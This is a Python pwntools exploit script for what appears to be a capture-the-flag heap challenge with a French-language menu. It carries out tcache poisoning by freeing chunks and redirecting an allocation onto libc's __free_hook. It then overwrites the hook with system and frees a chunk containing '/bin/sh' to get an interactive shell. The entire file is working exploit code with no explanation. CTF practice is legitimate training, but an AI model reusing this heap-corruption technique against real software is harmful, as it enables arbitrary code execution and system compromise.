#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall_patched')
libc = ELF('libc.so.6')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def create(index):
    io.sendlineafter(b'Modifier un block\n', b'0')
    io.sendlineafter(b'Index:', str(index).encode())

def delete(index):
    io.sendlineafter(b'Modifier un block\n', b'1')
    io.sendlineafter(b'Index: ', str(index).encode())

def display(index):
    io.sendlineafter(b'Modifier un block\n', b'2')
    io.sendlineafter(b'Index: ', str(index).encode())

def modify(index, data):
    io.sendlineafter(b'Modifier un block\n', b'3')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendafter(b'Data:', data)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

libc.address = 0x00007ffff7dd5000
create(0)
create(1)
create(2)

delete(1)
delete(0)

modify(0, p64(libc.sym['__free_hook']))

create(1)
create(0)



modify(0, p64(libc.sym['system']))

modify(1,b'/bin/sh')
delete(1)

io.interactive()

